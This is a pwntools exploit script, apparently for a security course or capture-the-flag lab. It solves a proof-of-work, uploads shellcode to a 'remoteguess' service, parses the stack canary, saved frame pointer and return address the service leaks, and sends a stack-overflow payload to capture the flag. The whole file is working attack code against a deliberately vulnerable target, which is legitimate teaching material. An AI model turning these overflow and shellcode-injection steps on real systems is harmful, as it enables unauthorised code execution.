#!/usr/bin/env python3

import os
import sys
from pwn import *

def solve_pow(r):
    msg = r.recvuntil(b'string S: ').decode()
    print(msg)
    prefix = msg.split("'")[1]
    print('=====================================================')
    print("Solving ...")
    for i in range(1000000000):
        h = hashlib.sha1((prefix + str(i)).encode()).hexdigest()
        if h[0:6] == '000000':
            solved = str(i).encode()
            print("string S =", solved)
            print("base64-encoded string S =", base64.b64encode(solved))
            print("sha1(P+decode(S)) =", h)
            break;
    print('=====================================================')
    r.send(base64.b64encode(solved))
    r.send('\n')


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("usage: {} solver-program".format(sys.argv[0]))
        sys.exit(-1)

    r = process("./remoteguess", shell=True)
    #r = remote("up23.zoolab.org", 10816)

    if type(r) != pwnlib.tubes.process.process:
        solve_pow(r)
        print(r.recvline().decode())


    payload = None
    if os.path.exists(sys.argv[1]):
        with open(sys.argv[1], 'rb') as f:
            payload = f.read()

    if payload != None:
        print(r.recvuntil(b'send to me? ').decode())
        # elf header syntax
        if (len(payload) > 4 and payload[0:4] == b'\x7fELF'):
            r.sendline(str(len(payload)).encode())
            print(len(payload))
            elf = ELF(sys.argv[1])
            print(r.sendlineafter(b'to call? ', str(elf.symbols['shellcode']).encode()).decode())
            print("{}(DEC)/{}(HEX)".format(elf.symbols['shellcode'], hex(elf.symbols['shellcode'])))
            print(r.sendafter(b'bytes): ', payload).decode())
        else:
            context.os = 'linux'
            context.arch = 'amd64'
            asm_code = asm(payload.decode())
            r.sendline(str(len(asm_code)).encode())
            print(len(asm_code))
            print(r.sendlineafter(b'to call? ', str(0).encode()).decode())
            print(0)
            print(r.sendafter(b'bytes): ', asm_code).decode())
    else:
        r.close()


    print(r.recvuntil(b'Stack Top (Lower address)\n').decode())

    msg = r.recvline().decode()
    print(msg, end='')
    canary = msg.split(":")[1].split("x")[1]

    msg = r.recvline().decode()
    print(msg, end='')
    rbp = msg.split(":")[1].split("x")[1]

    msg = r.recvline().decode()
    print(msg, end='')
    return_addr = msg.split(":")[1].split("x")[1]

    print(r.recvuntil(b'Show me your answer? ').decode())

    # local variable : char buf[16] + int val + int sz => 24 bytes
    # magic : main rbp-0x64
    # main : rsp = rbp-0x70
    # magic : main rsp+0xc
    r.send(b'0' * 24 + p64(int(canary,16)) + p64(int(rbp,16)) + p64(int(return_addr,16)) + b'0' * 12 + p32(0))

    print(r.recvuntil(b'}').decode())
    r.close()
